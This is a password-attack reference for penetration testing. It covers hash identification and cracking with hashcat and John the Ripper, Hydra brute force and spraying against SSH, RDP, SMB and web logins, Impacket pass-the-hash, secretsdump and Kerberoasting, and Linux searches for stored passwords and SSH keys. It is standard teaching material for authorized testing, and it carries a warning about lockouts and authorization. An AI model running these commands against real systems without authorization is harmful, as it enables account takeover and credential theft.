# Password Security Testing

## Overview

Password attacks fall into two categories:
- **Offline attacks**: Cracking password hashes (no target interaction)
- **Online attacks**: Brute forcing live services (requires target interaction)

Offline attacks are preferred when possible — they're faster, stealthier, and don't trigger lockout policies.

## Hash Identification

Before cracking, identify the hash type:

```bash
# Identify hash format
hashid 'hash_value'
hash-identifier

# Common hash formats:
# MD5:     32 hex chars                    e.g., 5d41402abc4b2a76b9719d911017c592
# SHA1:    40 hex chars                    e.g., aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d
# SHA256:  64 hex chars                    e.g., 2c26b46b68ffc68ff99b453c1d304134134...
# bcrypt:  starts with $2a$, $2b$, $2y$    e.g., $2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
# NTLM:    32 hex chars (from Windows)     e.g., b4b9b02e6f09a9bd760f388b67351e2b
# MySQL:   16 or 40 chars                  e.g., 606727496645bcba (old) or *E74858...
```

## Offline Hash Cracking

### Hashcat (GPU-accelerated, preferred for large jobs)

```bash
# Basic hash cracking
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
# -m 0: MD5 hash type

# Common hash type codes:
# -m 0     = MD5
# -m 100   = SHA1
# -m 1400  = SHA256
# -m 3200  = bcrypt
# -m 1000  = NTLM
# -m 1800  = SHA-512 (Unix)
# -m 500   = MD5-crypt (Unix)
# -m 2500  = WPA/WPA2

# Dictionary attack with rules
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# Rules modify words: append numbers, capitalize, leetspeak, etc.

# Mask attack (pattern-based)
hashcat -m 0 hash.txt -a 3 ?u?l?l?l?d?d?d?d
# -a 3: mask attack
# ?u = uppercase, ?l = lowercase, ?d = digit, ?s = special, ?a = all

# Common mask patterns:
# 8-char mixed:   -a 3 ?a?a?a?a?a?a?a?a
# Company2024:    -a 3 ?u?l?l?l?l?l?l?d?d?d?d
# Year suffix:    -a 3 ?u?l?l?l?l?l?l?d?d?d?d

# Hybrid attack (word + mask)
hashcat -m 0 hash.txt -a 6 /usr/share/wordlists/rockyou.txt ?d?d?d?d
# Appends 4 digits to each word
```

### John the Ripper (versatile, good for quick jobs)

```bash
# Auto-detect and crack
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Specify format
john --format=md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Linux password file cracking
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

# Show cracked passwords
john --show hash.txt

# Incremental mode (brute force, slow)
john --incremental hash.txt

# ZIP file cracking
zip2john protected.zip > zip_hash.txt
john zip_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# RAR file cracking
rar2john protected.rar > rar_hash.txt
john rar_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# SSH key cracking
ssh2john id_rsa > ssh_hash.txt
john ssh_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Keepass database cracking
keepass2john database.kdbx > keepass_hash.txt
john keepass_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Custom Wordlist Generation

```bash
# CeWL - generate wordlist from target website
cewl http://target.com -d 2 -m 5 -w custom_wordlist.txt
# -d: depth, -m: minimum word length

# Crunch - generate wordlist by pattern
crunch 8 12 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt
# 8-12 char words from given charset

# Mentalist (GUI) - rule-based wordlist generation
mentalist

# CUPP - personalized wordlist based on target info
cupp -i  # Interactive mode, asks for target details
```

## Online Brute Force Attacks

**Warning:** Online attacks generate significant noise and can trigger account lockouts. Only use when authorized and after confirming no lockout policy exists.

### Hydra - Network Service Brute Force

```bash
# SSH brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target -t 4
# -t 4: 4 parallel connections (don't go too high for SSH)

# FTP brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://target

# HTTP POST form brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-post-form \
  "/login.php:user=^USER^&password=^PASS^:F=Login failed"
# ^USER^ and ^PASS^ are replaced with username/password
# F= indicates the failure string

# HTTP Basic Auth brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-get /admin/

# MySQL brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt target mysql

# RDP brute force
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://target

# SMB brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt smb://target

# Multiple users from file
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://target
```

### Password Spraying (one password, many users)

```bash
# Use with caution - tests one common password against many accounts
hydra -L users.txt -p "Spring2024!" ssh://target
```

## Pass-the-Hash / Credential Attacks

### Windows Environments

```bash
# Pass-the-hash with Impacket
impacket-psexec -hashes :NTLM_HASH administrator@target
impacket-wmiexec -hashes :NTLM_HASH administrator@target
impacket-smbexec -hashes :NTLM_HASH administrator@target

# Extract hashes from SAM database
impacket-secretsdump target/administrator:password@target

# Kerberoasting (Active Directory)
impacket-GetUserSPNs target.local/user:password -request

# AS-REP roasting
impacket-GetNPUsers target.local/ -usersfile users.txt
```

### Linux Environments

```bash
# Search for interesting files
find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null | xargs grep -i "password" 2>/dev/null

# Check for SSH keys
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null

# Check bash history
cat ~/.bash_history | grep -i "pass\|pwd\|key"
```

## Wordlist Resources

Kali comes with wordlists in `/usr/share/wordlists/`:
- `rockyou.txt` — most common password list (14M+ passwords)
- `dirb/common.txt` — common directory names
- `dirbuster/` — various directory lists
- `seclists/` — comprehensive collection (install: `apt install seclists`)

Additional resources:
- SecLists GitHub: https://github.com/danielmiessler/SecLists
- CrackStation wordlists
- Probable-Wordlists

## Workflow

```
1. Obtain hashes or identify target service
2. Identify hash type (hashid, hash-identifier)
3. Choose attack strategy:
   ├─ Have hashes? → Offline cracking (hashcat/john)
   │   ├─ Start with rockyou.txt + rules
   │   ├─ Try mask attack if pattern known
   │   └─ Generate custom wordlist if target info available
   └─ Need to brute force service? → Online attack (hydra)
       ├─ Confirm no lockout policy
       ├─ Use targeted username/password lists
       └─ Rate limit appropriately
```
